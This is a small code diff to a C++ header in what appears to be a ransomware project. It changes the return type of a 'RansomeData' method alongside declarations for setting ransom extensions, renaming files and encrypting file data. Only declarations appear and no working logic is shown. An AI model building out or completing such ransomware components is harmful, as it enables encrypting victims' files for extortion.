@@ -24,7 +24,7 @@ namespace win {
 
 	public:
 		bool SetRansomExtension(std::vector<std::wstring>* ext_list);
-		void RansomeData(std::wstring_view target_path);
+		DWORD RansomeData(std::wstring_view target_path);
 	private:
 		std::wstring ChangeFilenameExtensionForEncrypt(std::wstring_view target_file_path);
 		DWORD EncryptFileData(std::wstring_view target_file_path);
